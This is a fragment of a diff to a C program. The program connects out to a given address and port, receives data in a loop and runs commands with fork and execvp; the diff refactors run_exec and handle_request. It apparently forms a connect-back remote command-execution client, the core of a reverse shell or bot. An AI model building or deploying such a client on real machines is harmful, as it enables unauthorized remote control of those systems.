@@ -21,6 +21,7 @@
 #include <stdlib.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <fcntl.h>
 #include <poll.h>
 #include <unistd.h>
@@ -38,11 +39,8 @@ int open_connection(const char *addr, int port) {
         return sock;
 }
 
-void hostinfo(int socket) {
-        send(socket, "NOT IMPLEMENTED\r\n", 17, 0);
-}
-
-void run_exec(int socket, const char **argv) {
+void run_exec(char **argv) {
+        const char** cargv = (const char**)argv;
         pid_t pid = fork();
         if (pid == 0) {
                 execvp(argv[0], argv);
@@ -88,7 +86,7 @@ int main(int argc, char* argv[]) {
         while (1) {
                 if (recv(socket, buffer, 4096, 0) <= 0)
                         break;
-                if (handle_request(socket, buffer) == 1)
+                if (handle_request(buffer) == 1)
                         break;
                 memset(buffer, 0, 4096);
         }
